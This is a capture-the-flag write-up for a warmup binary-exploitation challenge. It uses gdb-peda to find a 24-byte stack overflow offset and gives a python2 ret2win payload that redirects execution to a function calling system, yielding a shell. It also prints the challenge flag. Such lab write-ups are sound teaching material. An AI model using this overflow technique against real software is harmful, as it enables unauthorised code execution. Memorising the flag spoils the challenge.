This is a simple warmup pwn challenge you just need to find the offset and call the overflowed function so at first lets disassemble it using gdb(PEDA)
```
┌─[shark@5h4rk]─[~/Downloads]
└──╼ $gdb w4rmup 
GNU gdb (Debian 10.1-1+b1) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/home/shark/peda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/home/shark/peda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from w4rmup...
(No debugging symbols found in w4rmup)
gdb-peda$ r
Starting program: /home/shark/Downloads/w4rmup 
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE
-134591997

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x0 
RDX: 0x0 
RSI: 0x7fffffffb8a0 ("-134591997\n")
RDI: 0x7ffff7fa7670 --> 0x0 
RBP: 0x4343434343434343 ('CCCCCCCC')
RSP: 0x7fffffffdf38 ("DDDDDDDDEEEEEEEE")
RIP: 0x4011fb (<main+153>:	ret)
R8 : 0x0 
R9 : 0xb ('\x0b')
R10: 0x7fffffffb72f --> 0xb00 ('')
R11: 0x246 
R12: 0x401080 (<_start>:	xor    ebp,ebp)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011f0 <main+142>:	call   0x401040 <printf@plt>
   0x4011f5 <main+147>:	mov    eax,0x0
   0x4011fa <main+152>:	leave  
=> 0x4011fb <main+153>:	ret    
   0x4011fc <overflowed>:	push   rbp
   0x4011fd <overflowed+1>:	mov    rbp,rsp
   0x401200 <overflowed+4>:	lea    rdi,[rip+0xe01]        # 0x402008
   0x401207 <overflowed+11>:	call   0x401030 <system@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf38 ("DDDDDDDDEEEEEEEE")
0008| 0x7fffffffdf40 ("EEEEEEEE")
0016| 0x7fffffffdf48 --> 0x100000000 
0024| 0x7fffffffdf50 --> 0x401162 (<main>:	push   rbp)
0032| 0x7fffffffdf58 --> 0x7ffff7e0c7cf (<init_cacheinfo+287>:	mov    rbp,rax)
0040| 0x7fffffffdf60 --> 0x0 
0048| 0x7fffffffdf68 --> 0x7f11df9b3e9e0de9 
0056| 0x7fffffffdf70 --> 0x401080 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011fb in main ()

```
in this i have created a simple pattren and found that during the line `AAAAAAAABBBBBBBBCCCCCCCC` the function is getting overflowed <br>
so we got the offset as 24 and its time to call the function, to call the function we need to know the address of ret and push so lets find that first <br>
```
gdb-peda$ disass overflowed 
Dump of assembler code for function overflowed:
   0x00000000004011fc <+0>:	push   rbp
   0x00000000004011fd <+1>:	mov    rbp,rsp
   0x0000000000401200 <+4>:	lea    rdi,[rip+0xe01]        # 0x402008
   0x0000000000401207 <+11>:	call   0x401030 <system@plt>
   0x000000000040120c <+16>:	nop
   0x000000000040120d <+17>:	pop    rbp
   0x000000000040120e <+18>:	ret    
End of assembler dump.

```
address of ret: `0x000000000040120e`
address of push: `0x00000000004011fc`

so now its time to craft the payload so, the payload be like `offset + p64(ret) + p64(push)`

final payload <br> 
`(python2 -c 'print "A"*24 + "\x0e\x12\x40\x00\x00\x00\x00\x00" + "\xfc\x11\x40\x00\x00\x00\x00\x00"'; cat)  | ./w4rmup`

BOOM you got the shell now just cat the flag 
flag:- `vulncon{y0u_4re_all_s3t_for_pwn}`
